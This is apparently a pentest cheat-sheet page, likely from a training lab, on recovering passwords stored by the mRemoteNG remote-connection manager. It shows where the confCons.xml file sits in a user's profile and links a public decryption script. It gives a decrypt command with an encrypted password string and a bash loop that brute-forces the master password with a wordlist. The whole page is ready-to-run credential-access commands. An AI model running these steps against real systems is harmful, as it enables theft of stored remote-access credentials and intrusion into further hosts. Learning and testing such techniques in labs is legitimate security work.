# mRemoteNG Password Extraction

OS: Linux, Windows
Description: Crack Password stored within mRemoteNG
Security Domains: Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), python (https://www.notion.so/python-1444c8e523768064b118fb3c0d424051?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

### RemoteNG Configuration Files

```jsx
ls C:\Users\julio\AppData\Roaming\mRemoteNG
```

- Confcons.xml is the file to pull

### RemoteNG Decrypt Script

```jsx
https://github.com/haseebT/mRemoteNG-Decrypt
```

- Decrypt Syntax
- This won’t work

```jsx
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig=="
```

### Brute Force

```jsx
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
```